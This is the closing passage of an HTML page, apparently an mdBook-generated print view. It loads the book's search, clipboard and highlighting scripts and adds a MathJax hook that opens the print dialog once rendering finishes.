        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>

    </div>
    </body>
</html>
